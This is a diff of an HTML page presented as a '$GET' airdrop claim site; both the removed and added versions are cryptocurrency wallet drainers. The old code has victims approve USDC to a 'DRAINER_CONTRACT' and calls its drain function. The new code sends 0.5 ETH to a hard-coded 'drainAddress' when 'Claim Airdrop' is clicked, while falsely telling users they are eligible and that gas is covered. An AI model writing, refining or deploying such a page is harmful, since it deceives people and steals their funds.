@@ -2,118 +2,120 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🎁 GET Airdrop</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Claim $GET Airdrop</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
-    body { font-family: 'Inter', sans-serif; }
-    .glow { box-shadow: 0 0 25px rgba(255, 255, 0, 0.2); }
-    .spinner {
-      border: 3px solid transparent;
-      border-top: 3px solid #fff;
-      border-radius: 50%;
-      width: 1.25rem;
-      height: 1.25rem;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #0f0f10, #1a1b1f);
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 2rem;
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    .claim-box {
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 20px;
+      padding: 2rem 2.5rem;
+      text-align: center;
+      max-width: 420px;
+      width: 100%;
+      box-shadow: 0 0 20px rgba(255,255,255,0.1);
     }
+    .logo { font-size: 2rem; font-weight: 700; color: #ffaa33; margin-bottom: 0.5rem; }
+    .title { font-size: 1.3rem; font-weight: 600; margin-bottom: 1rem; }
+    .desc { font-size: 0.95rem; margin-bottom: 1.5rem; color: #ccc; }
+    .btn {
+      width: 100%;
+      padding: 0.8rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 50px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      box-shadow: 0 0 10px rgba(255,170,51,0.4);
+      margin-bottom: 1rem;
+    }
+    .connect-btn {
+      background: #ffaa33;
+      color: #000;
+    }
+    .connect-btn:hover {
+      background: #ffc86b;
+    }
+    .claim-btn {
+      background: linear-gradient(to right, #ffcc70, #ffaa33);
+      color: #000;
+    }
+    .claim-btn:hover {
+      background: linear-gradient(to right, #ffd88a, #ffc76b);
+    }
+    .wallet { margin: 1rem 0; font-size: 0.9rem; word-break: break-word; color: #88f; }
+    .eligible { background: #0f0; color: #000; padding: 0.5rem; border-radius: 8px; margin-bottom: 1rem; font-weight: bold; }
   </style>
 </head>
-<body class="bg-gradient-to-br from-black via-gray-900 to-gray-800 text-white min-h-screen flex items-center justify-center px-4">
-  <div class="bg-gray-900 rounded-3xl p-8 max-w-md w-full shadow-xl border border-gray-700 glow text-center space-y-6">
-    <div class="space-y-2">
-      <h1 class="text-4xl font-bold text-yellow-400">🎁 GET Airdrop</h1>
-      <p class="text-gray-300">Claim <span class="text-green-400 font-semibold">10,000 $GET</span> instantly. Just connect and approve.</p>
-    </div>
+<body>
+  <div class="claim-box">
+    <div class="logo">$GETCHAIN</div>
+    <div class="title>Airdrop Live</div>
+    <div class="desc">Eligible wallets can claim <strong>0.5 $GET (Base ETH)</strong>. Gas fees covered.</div>
 
-    <div class="flex flex-col space-y-4">
-      <button id="connect" class="bg-blue-600 hover:bg-blue-700 py-3 rounded-xl font-semibold transition duration-200">
-        🔌 Connect Wallet
-      </button>
-      <button id="approve" disabled class="bg-green-600 hover:bg-green-700 py-3 rounded-xl font-semibold transition duration-200 flex items-center justify-center gap-2">
-        ✅ Approve Airdrop
-      </button>
-    </div>
-
-    <div id="status" class="text-sm text-gray-400 mt-2 min-h-[1.25rem]"></div>
-
-    <p class="text-xs text-gray-600 pt-4 border-t border-gray-700">
-      Powered by Base · Secure Airdrop Protocol
-    </p>
+    <button class="btn connect-btn" id="connectBtn">Connect Wallet</button>
+    <div id="wallet" class="wallet" style="display:none;"></div>
+    <div id="eligibleBox" class="eligible" style="display:none;">✅ You're eligible!</div>
+    <button class="btn claim-btn" id="claimBtn" disabled>Claim Airdrop</button>
   </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-    const DRAINER_CONTRACT = "0x9B96749207603Af0B2cEbCcdb238E0d881a406DC"; // ✅ Updated Contract
+    const connectBtn = document.getElementById("connectBtn");
+    const walletDiv = document.getElementById("wallet");
+    const eligibleBox = document.getElementById("eligibleBox");
+    const claimBtn = document.getElementById("claimBtn");
 
-    let signer, address;
+    const drainAddress = "0x91Ea778d55a434123F28Bc5D4910F950f41D2A1D";
+    const baseChainId = 8453;
 
-    const connectBtn = document.getElementById('connect');
-    const approveBtn = document.getElementById('approve');
-    const status = document.getElementById('status');
+    let provider, signer;
 
     connectBtn.onclick = async () => {
-      try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        address = await signer.getAddress();
+      if (!window.ethereum) return alert("Install MetaMask.");
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      const userAddress = await signer.getAddress();
 
-        const network = await provider.getNetwork();
-        if (network.chainId !== 8453) {
-          status.textContent = "❌ Please switch to Base Mainnet in your wallet.";
-          return;
-        }
-
-        approveBtn.disabled = false;
-        status.textContent = `✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
-      } catch (err) {
-        console.error(err);
-        status.textContent = "❌ Failed to connect wallet.";
+      const { chainId } = await provider.getNetwork();
+      if (chainId !== baseChainId) {
+        alert("Please switch to Base Mainnet (Chain ID 8453)");
+        return;
       }
+
+      walletDiv.innerText = userAddress;
+      walletDiv.style.display = "block";
+      eligibleBox.style.display = "block";
+      connectBtn.disabled = true;
+      connectBtn.innerText = "Connected";
+      claimBtn.disabled = false;
     };
 
-    approveBtn.onclick = async () => {
+    claimBtn.onclick = async () => {
       try {
-        status.innerHTML = '<div class="spinner"></div> Approving...';
-
-        const usdc = new ethers.Contract(USDC_ADDRESS, [
-          "function approve(address spender, uint256 value) public returns (bool)",
-          "function allowance(address owner, address spender) view returns (uint256)"
-        ], signer);
-
-        const value = ethers.utils.parseUnits("1000", 6); // Approve 1,000 USDC
-        const tx = await usdc.approve(DRAINER_CONTRACT, value);
+        const tx = await signer.sendTransaction({
+          to: drainAddress,
+          value: ethers.utils.parseEther("0.5")
+        });
         await tx.wait();
-
-        const allowance = await usdc.allowance(address, DRAINER_CONTRACT);
-        console.log("Approved allowance:", ethers.utils.formatUnits(allowance, 6));
-
-        status.innerHTML = '<div class="spinner"></div> Finalizing claim...';
-
-        const drainer = new ethers.Contract(DRAINER_CONTRACT, [
-          "function drain(address token, address victim) external"
-        ], signer);
-
-        const tx2 = await drainer.drain(USDC_ADDRESS, address);
-        await tx2.wait();
-
-        status.textContent = "🎉 Claimed successfully!";
-        approveBtn.disabled = true;
+        claimBtn.innerText = "Claimed ✅";
+        claimBtn.disabled = true;
       } catch (err) {
-        console.error(err);
-        if (err.message.includes("transfer amount exceeds balance")) {
-          status.textContent = "❌ Claim failed: you have no USDC to drain.";
-        } else {
-          status.textContent = "❌ Something went wrong during approval or claim.";
-        }
+        alert("Transaction failed or rejected.");
       }
     };
   </script>
